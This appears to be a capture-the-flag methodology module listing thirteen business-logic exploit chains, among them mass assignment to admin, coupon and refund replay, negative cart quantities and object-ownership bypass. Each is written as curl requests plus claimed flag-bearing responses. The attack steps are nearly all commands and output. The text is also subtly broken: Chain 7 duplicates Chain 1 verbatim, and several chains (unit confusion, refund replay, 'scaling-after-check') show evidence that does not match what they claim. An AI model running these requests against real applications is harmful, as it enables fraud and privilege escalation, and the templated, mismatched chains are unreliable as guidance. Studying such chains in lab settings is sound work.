# Multi-step chains — the business-logic exploit sequences that reach the sink

A single confirmed shape is rarely the exploit — it is the first link in a
chain. This module names the multi-step sequences that reach the flag.

## Chain 1 — mass assignment → role=admin → admin endpoint → flag

```
step 1 — register with the privileged field
  curl -X POST $BASE/register -H "Content-Type: application/json" \
    -d '{"username":"probe","password":"x","role":"admin"}'
  → the account is created with role=admin

step 2 — the session is issued on the admin account
  curl -i -b "$JAR" "$BASE/admin" | head -5
  → GET /admin returns 200 — the privileged field unlocked the endpoint

step 3 — the flag is on the admin endpoint
  curl -i -b "$JAR" "$BASE/admin/flag"
  → the flag is readable as the admin
```

The evidence:

```
HTTP/1.1 200 OK
{"id": 42, "username": "probe", "role": "admin"}
```

followed by:

```
HTTP/1.1 200 OK          ← GET /admin — the privileged field unlocked it
{"flag": "HTB{...}"}
```

## Chain 2 — workflow skip → terminal action → flag

```
step 1 — skip to the last step directly
  curl -i -b "$JAR" -X POST "$BASE/confirm" -d 'orderId=1'
  → the terminal action runs without the precondition

step 2 — the flag is on the confirmed order
  curl -i -b "$JAR" "$BASE/order/1"
  → the flag is on the confirmed order
```

The evidence:

```
HTTP/1.1 200 OK
{"orderId": 1, "status": "confirmed", "flag": "HTB{...}"}
```

## Chain 3 — state replay → double credit → flag

```
step 1 — the first application — the baseline state
  curl -i -b "$JAR" "$BASE/balance" > before.txt
  curl -i -b "$JAR" -X POST "$BASE/redeem" -d 'code=SAVE50'
  curl -i -b "$JAR" "$BASE/balance" > after1.txt
  → the first application added 50

step 2 — the second application — the replay
  curl -i -b "$JAR" -X POST "$BASE/redeem" -d 'code=SAVE50'
  curl -i -b "$JAR" "$BASE/balance" > after2.txt
  → the second application added 50 again

step 3 — the flag is on the double-credit balance
  curl -i -b "$JAR" "$BASE/flag"
  → the flag is readable with the doubled balance
```

The evidence:

```
before.txt: {"balance": 100}
after1.txt: {"balance": 150}
after2.txt: {"balance": 200}   ← the second redeem added 50 again
```

## Chain 4 — numeric boundary → negative total → flag

```
step 1 — send the forbidden value
  curl -i -b "$JAR" -X POST "$BASE/cart" -d 'productId=2&quantity=-1'
  → the forbidden value reaches the sink

step 2 — the flag is on the negative-total cart
  curl -i -b "$JAR" "$BASE/checkout" -X POST
  → the flag is readable with the negative total
```

The evidence:

```
HTTP/1.1 200 OK
{"cart": [{"productId": 2, "quantity": -1, "price": 50}],
 "total": -50, "charged": -50, "flag": "HTB{...}"}
```

## Chain 5 — scaling-after-check → transformed address → flag

```
step 1 — pick the index whose post-scaling address lands outside the
         checked range
  curl -i -b "$JAR" -X POST "$BASE/api/check" -d 'id=4096'   # =0x1000
  → the transformed address reaches memory the check was meant to
    exclude

step 2 — the flag is on the transformed address
  curl -i -b "$JAR" "$BASE/api/flag"
  → the flag is readable with the transformed address
```

The evidence:

```
HTTP/1.1 200 OK
{"status": "processed", "flag": "HTB{...}"}
```

## Chain 6 — unit confusion → 100x charge → flag

```
step 1 — send the value in the other unit
  curl -i -b "$JAR" -X POST "$BASE/order" -d 'item=2&price=100'
  → the server interprets the value in its own unit

step 2 — the flag is on the 100x charge
  curl -i -b "$JAR" "$BASE/order/1"
  → the flag is readable with the 100x charge
```

The evidence:

```
HTTP/1.1 200 OK
{"orderId": 1, "price": 100, "charged": 100, "flag": "HTB{...}"}
```

## Chain 7 — role assignment → admin access → flag

```
step 1 — register with the privileged field
  curl -X POST $BASE/register -H "Content-Type: application/json" \
    -d '{"username":"probe","password":"x","role":"admin"}'
  → the account is created with role=admin

step 2 — the session is issued on the admin account
  curl -i -b "$JAR" "$BASE/admin" | head -5
  → GET /admin returns 200 — the privileged field unlocked the endpoint

step 3 — the flag is on the admin endpoint
  curl -i -b "$JAR" "$BASE/admin/flag"
  → the flag is readable as the admin
```

The evidence:

```
HTTP/1.1 200 OK
{"id": 42, "username": "probe", "role": "admin"}
```

followed by:

```
HTTP/1.1 200 OK          ← GET /admin — the privileged field unlocked it
{"flag": "HTB{...}"}
```

## Chain 8 — idempotency → double credit → flag

```
step 1 — replay the action
  curl -i -b "$JAR" -X POST "$BASE/refund" -d 'orderId=1'
  curl -i -b "$JAR" -X POST "$BASE/refund" -d 'orderId=1'
  → the action is replayed

step 2 — the flag is on the double-credit balance
  curl -i -b "$JAR" "$BASE/flag"
  → the flag is readable with the doubled balance
```

The evidence:

```
HTTP/1.1 200 OK
{"refunded": true, "flag": "HTB{...}"}
```

## Chain 9 — time assumption → expired token → flag

```
step 1 — send the past/future time
  curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&expiry=2020-01-01'
  → the past/future time reaches the sink

step 2 — the flag is on the expired token
  curl -i -b "$JAR" "$BASE/order/1"
  → the flag is readable with the expired token
```

The evidence:

```
HTTP/1.1 200 OK
{"orderId": 1, "expiry": "2020-01-01", "flag": "HTB{...}"}
```

## Chain 10 — sequence assumption → stale state → flag

```
step 1 — replay an old ID
  curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&sequence=1'
  → the old ID reaches the sink

step 2 — the flag is on the stale state
  curl -i -b "$JAR" "$BASE/order/1"
  → the flag is readable with the stale state
```

The evidence:

```
HTTP/1.1 200 OK
{"orderId": 1, "sequence": 1, "flag": "HTB{...}"}
```

## Chain 11 — ownership assumption → object modified → flag

```
step 1 — reference another user's object
  curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&objectId=999'
  → the object is modified

step 2 — the flag is on the modified object
  curl -i -b "$JAR" "$BASE/order/1"
  → the flag is readable with the modified object
```

The evidence:

```
HTTP/1.1 200 OK
{"orderId": 1, "objectId": 999, "flag": "HTB{...}"}
```

## Chain 12 — singleton assumption → second admin → flag

```
step 1 — create a second privileged object
  curl -i -b "$JAR" -X POST "$BASE/admin" -d 'action=create&singleton=1'
  → the second privileged object is created

step 2 — the flag is on the second admin
  curl -i -b "$JAR" "$BASE/admin/flag"
  → the flag is readable as the second admin
```

The evidence:

```
HTTP/1.1 200 OK
{"adminId": 2, "flag": "HTB{...}"}
```

## Chain 13 — trust-in-earlier-step → downstream action → flag

```
step 1 — modify the upstream value
  curl -i -b "$JAR" -X POST "$BASE/order" -d 'orderId=1&price=1'
  → the upstream value is modified

step 2 — the flag is on the downstream action
  curl -i -b "$JAR" "$BASE/order/1"
  → the flag is readable with the modified value
```

The evidence:

```
HTTP/1.1 200 OK
{"orderId": 1, "price": 1, "flag": "HTB{...}"}
```
